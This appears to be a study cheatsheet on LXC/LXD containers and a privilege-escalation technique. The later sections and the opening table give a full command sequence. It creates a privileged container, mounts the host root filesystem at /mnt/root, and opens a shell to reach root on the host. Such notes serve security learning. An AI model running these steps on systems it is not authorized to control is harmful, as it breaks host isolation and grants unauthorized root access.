##  LXC / LXD Privilege Escalation – Cheatsheet

|Command|Use|
|---|---|
|`id`|Check if user is in `lxd` or `lxc` group|
|`lxc image list`|List available container images|
|`lxc image import file.tar.xz --alias name`|Import container image|
|`lxc init image alias -c security.privileged=true`|Create privileged container|
|`lxc config device add container root disk source=/ path=/mnt/root recursive=true`|Mount host filesystem inside container|
|`lxc start container`|Start container|
|`lxc exec container /bin/bash`|Enter container shell|
|`ls /mnt/root`|Access host filesystem (if mounted)|
|`whoami`|Confirm root inside container|

##  1. Containers vs Virtual Machines

###  Containers

- Share the **same OS kernel**
    
- Only isolate applications
    
- Lightweight and fast
    

👉 Example: Many apps running inside one Linux system

---

###  Virtual Machines

- Each VM has its own **full OS**
    
- Uses hypervisor (VirtualBox, VMware)
    
- Heavy but strongly isolated
    

👉 Example: Separate computers inside one machine

---

##  2. Why isolation matters

Isolation helps:

### ✔ Security

- One app cannot easily break whole system
    

### ✔ Stability

- If one app crashes, others still run
    

### ✔ Resource control

- CPU, RAM, disk can be managed per app
    

---

##  3. What is LXC (Linux Containers)

LXC means:

👉 “Run multiple isolated Linux environments using same kernel”

### Key idea:

- Each container = mini Linux system
    
- BUT shares host kernel
    

👉 So it is NOT a full VM

---

### Why LXC is popular

- Lightweight
    
- Fast startup
    
- Easy to manage many systems
    

---

##  4. Docker vs LXC idea (important concept)

- LXC = low-level Linux container system
    
- Docker = user-friendly tool built on containers
    

👉 Docker made containers popular and easy

---

## ⚙️ 5. What is LXD

LXD is:

👉 “Advanced system container manager for LXC”

### Difference:

|LXC|LXD|
|---|---|
|Basic container tool|Full container management system|
|Low-level|High-level|
|Manual setup|Easier control|

---

##  6. Important security point (VERY IMPORTANT)

To use LXD for privilege escalation:

```bash
id
```

If you see:

```text
lxd
```

👉 You are in a powerful group

---

##  7. Why LXD is dangerous (privilege escalation idea)

If attacker is in `lxd` group:

👉 They can:

- Create containers
    
- Make them privileged
    
- Access host filesystem
    

So isolation breaks.

---

## 8. Using templates (important concept)

Admins often use:

```bash
ubuntu-template.tar.xz
```

Why?

- Fast deployment
    
- No setup required
    
- Saves time
    

⚠ Problem:

- Often insecure
    
- No passwords
    
- Weak permissions
    

---

## 9. Importing container image

```bash
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
```

👉 This loads a container template into system

---

##  10. Listing images

```bash
lxc image list
```

👉 Shows available container templates

---

##  11. Creating privileged container

```bash
lxc init ubuntutemp privesc -c security.privileged=true
```

### Meaning:

- Create container named `privesc`
    
- Make it **privileged**
    

👉 This disables isolation protections

---

##  12. Mounting host filesystem

```bash
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

### Meaning:

- Mount real system `/` into container
    
- Accessible at `/mnt/root`
    

👉 This is the KEY exploit step

---

##  13. Start container

```bash
lxc start privesc
```

---

##  14. Enter container shell
```bash
lxc exec privesc /bin/bash
```

Now you are inside container.

---

## 15. Access host system

```bash
ls /mnt/root
```

👉 This shows real host filesystem

- `/mnt/root/etc`
    
- `/mnt/root/root`
    
- `/mnt/root/var`
    

👉 At this point, you can become root on host
